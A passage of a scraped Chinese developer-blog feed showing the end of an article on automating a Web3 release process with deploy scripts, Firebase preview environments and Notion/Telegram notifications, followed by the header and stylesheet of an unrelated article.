└─────────────────────────────────────────────────────────────────┘
</code></pre>
<p>光是画出这张图，就发现了很多问题。</p>
<h3 data-id="heading-8">第二步：消灭手动配置</h3>
<p>最容易出错的环节是「配置更新」——每次都要手动把合约地址复制到前端配置文件。</p>
<p>我们的解决方案：<strong>让部署脚本自动更新配置</strong>。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 部署完成后自动执行</span>
func.<span class="hljs-property">runAtTheEnd</span> = <span class="hljs-literal">true</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">updateConfig</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// 读取部署结果</span>
  <span class="hljs-keyword">const</span> staking = <span class="hljs-keyword">await</span> deployments.<span class="hljs-title function_">get</span>(<span class="hljs-string">'Staking'</span>);

  <span class="hljs-comment">// 自动更新前端配置</span>
  <span class="hljs-keyword">const</span> configPath = <span class="hljs-string">'../frontend/src/config/contracts.ts'</span>;
  <span class="hljs-keyword">const</span> config = fs.<span class="hljs-title function_">readFileSync</span>(configPath, <span class="hljs-string">'utf-8'</span>);

  <span class="hljs-keyword">const</span> updated = config.<span class="hljs-title function_">replace</span>(
    <span class="hljs-regexp">/137: {\s*address: "0x[a-fA-F0-9]+"/</span>,
    <span class="hljs-string">`137: { address: "<span class="hljs-subst">${staking.address}</span>"`</span>
  );

  fs.<span class="hljs-title function_">writeFileSync</span>(configPath, updated);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'✅ 配置已自动更新'</span>);
};
</code></pre>
<p><strong>效果</strong>：配置更新从 15 分钟 → 0 分钟，且零错误。</p>
<h3 data-id="heading-9">第三步：脚本化部署命令</h3>
<p>把所有部署命令封装成脚本，减少记忆负担：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># deploy.sh - 一键部署脚本</span>

TARGET=<span class="hljs-variable">$1</span>  <span class="hljs-comment"># frontend | admin</span>
ENV=<span class="hljs-variable">$2</span>     <span class="hljs-comment"># preview | prod</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"📦 目标: <span class="hljs-variable">$TARGET</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"🌍 环境: <span class="hljs-variable">$ENV</span>"</span>

<span class="hljs-comment"># 构建</span>
pnpm build:<span class="hljs-variable">$TARGET</span>

<span class="hljs-comment"># 部署</span>
<span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$ENV</span>"</span> = <span class="hljs-string">"preview"</span> ]; <span class="hljs-keyword">then</span>
  firebase hosting:channel:deploy preview-<span class="hljs-variable">$RANDOM</span> --only <span class="hljs-variable">$TARGET</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"✅ 预览环境部署完成"</span>
<span class="hljs-keyword">else</span>
  firebase deploy --only hosting:<span class="hljs-variable">$TARGET</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"✅ 正式环境部署完成"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<p>现在部署只需要一条命令：</p>
<pre><code class="hljs language-bash" lang="bash">bash ./scripts/deploy.sh frontend prod
</code></pre>
<p><strong>效果</strong>：部署操作从 20 分钟 → 3 分钟。</p>
<h3 data-id="heading-10">第四步：增加预览环境</h3>
<p>在正式发布前，先部署到预览环境验证。这个小改动帮我们避免了无数次「部署完才发现有问题」的情况。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 先部署到预览环境</span>
bash ./scripts/deploy.sh frontend preview
<span class="hljs-comment"># 验证无误后再发布正式版</span>
bash ./scripts/deploy.sh frontend prod
</code></pre>
<p><strong>效果</strong>：意外处理时间从 60+ 分钟 → 10 分钟（偶尔）。</p>
<h3 data-id="heading-11">第五步：文档自动化</h3>
<p>每次发布都要写文档，而且文档格式基本固定。我们把它自动化了：</p>
<ol>
<li><strong>本地文档</strong>：基于模板自动生成 markdown 文件</li>
<li><strong>Notion 文档</strong>：通过 API 自动创建页面</li>
<li><strong>团队通知</strong>：通过 Telegram Bot 自动发送</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建 Notion 文档</span>
curl -X POST <span class="hljs-string">'https://api.notion.com/v1/pages'</span> \
  -H <span class="hljs-string">"Authorization: Bearer <span class="hljs-variable">$NOTION_TOKEN</span>"</span> \
  -d <span class="hljs-string">'{ "parent": {...}, "properties": {...}, "children": [...] }'</span>

<span class="hljs-comment"># 发送 Telegram 通知</span>
curl -X POST <span class="hljs-string">"https://api.telegram.org/bot<span class="hljs-variable">$TOKEN</span>/sendMessage"</span> \
  -d <span class="hljs-string">'{ "chat_id": "...", "text": "🚀 v1.4.0 已上线..." }'</span>
</code></pre>
<p><strong>效果</strong>：文档通知从 30 分钟 → 2 分钟。</p>
<hr/>
<h2 data-id="heading-12">优化前 vs 优化后</h2>





















































<table><thead><tr><th>环节</th><th>优化前</th><th>优化后</th><th>提升</th></tr></thead><tbody><tr><td>合约部署</td><td>30 分钟</td><td>5 分钟</td><td>6x</td></tr><tr><td>配置更新</td><td>15 分钟</td><td>0 分钟</td><td>∞</td></tr><tr><td>前端打包</td><td>10 分钟</td><td>3 分钟</td><td>3x</td></tr><tr><td>部署发布</td><td>20 分钟</td><td>3 分钟</td><td>7x</td></tr><tr><td>文档通知</td><td>30 分钟</td><td>2 分钟</td><td>15x</td></tr><tr><td>意外处理</td><td>60 分钟</td><td>2 分钟</td><td>30x</td></tr><tr><td><strong>总计</strong></td><td><strong>~3 小时</strong></td><td><strong>~15 分钟</strong></td><td><strong>12x</strong></td></tr></tbody></table>
<p>最重要的是：<strong>任何人都可以执行这个流程</strong>，不再依赖特定的人。</p>
<hr/>
<h2 data-id="heading-13">我们学到了什么</h2>
<h3 data-id="heading-14">1. 自动化要从痛点开始</h3>
<p>不要试图一次性自动化所有东西。先找到最痛的点（对我们来说是配置更新），解决它，然后再处理下一个。</p>
<h3 data-id="heading-15">2. 脚本比文档更可靠</h3>
<p>与其写一份「如何部署」的文档，不如写一个部署脚本。脚本不会过时，而文档会。</p>
<h3 data-id="heading-16">3. 预览环境是必须的</h3>
<p>多花 2 分钟部署到预览环境验证，能省下无数次「紧急修复」。</p>
<h3 data-id="heading-17">4. 让机器做机器擅长的事</h3>
<p>复制粘贴、格式检查、发送通知——这些事情机器比人做得更好。</p>
<h3 data-id="heading-18">5. 流程可视化很重要</h3>
<p>当你把流程画出来，问题就变得显而易见了。</p>
<hr/>
<h2 data-id="heading-19">下一步计划</h2>
<p>我们的发布流程还在持续优化。接下来计划做的事情：</p>
<ol>
<li><strong>接入 GitHub Actions</strong>：实现 push 到 main 分支自动部署</li>
<li><strong>增加自动化测试</strong>：部署前自动运行测试用例</li>
<li><strong>监控告警</strong>：部署后自动检查服务健康状态</li>
<li><strong>一键回滚</strong>：出问题时能快速回滚到上一个版本</li>
</ol>
<hr/>
<h2 data-id="heading-20">写在最后</h2>
<p>从 3 小时到 15 分钟，看起来是 10 倍的效率提升，但真正的收益远不止于此：</p>
<ul>
<li><strong>更少的人为错误</strong>：自动化消除了大部分手动操作的风险</li>
<li><strong>更快的迭代速度</strong>：发布不再是「大事」，可以更频繁地发布小改动</li>
<li><strong>更好的团队协作</strong>：任何人都可以执行发布，不再有「关键人依赖」</li>
<li><strong>更少的焦虑</strong>：发布不再让人紧张，因为流程是可预期的</li>
</ul>
<p>如果你的团队也在为发布流程头疼，希望这篇文章能给你一些启发。</p>
<p>记住：<strong>最好的流程是不需要思考的流程。</strong></p>
<hr/>
<blockquote>
<p>本文来自 <strong>AI SOP 蓝皮书</strong> 的实战经验分享。</p>
<p>📘 <strong>AI SOP 蓝皮书</strong>：一个专注于 AI + Web3 工作流优化的开源项目，通过标准化 SOP 让团队效率提升 10 倍。</p>
<p>🔗 GitHub: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsmartchainark%2Fai-web3-blueprint" target="_blank" title="https://github.com/smartchainark/ai-web3-blueprint" ref="nofollow noopener noreferrer">github.com/smartchaina…</a></p>
<p>如果这篇文章对你有帮助，欢迎 Star 支持！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[历史十大帝王拉到一个群聊会发生什么事？朱元璋直接开喷]]></title>    <link>https://juejin.cn/post/7589920318132862976</link>    <guid>https://juejin.cn/post/7589920318132862976</guid>    <pubDate>2026-01-01T08:55:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589920318132862976" data-draft-id="7589918470789496866" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="历史十大帝王拉到一个群聊会发生什么事？朱元璋直接开喷"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-01T08:55:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LucianaiB"/> <meta itemprop="url" content="https://juejin.cn/user/1269294586664749"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            历史十大帝王拉到一个群聊会发生什么事？朱元璋直接开喷
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1269294586664749/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LucianaiB
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T08:55:50.000Z" title="Thu Jan 01 2026 08:55:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读20分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 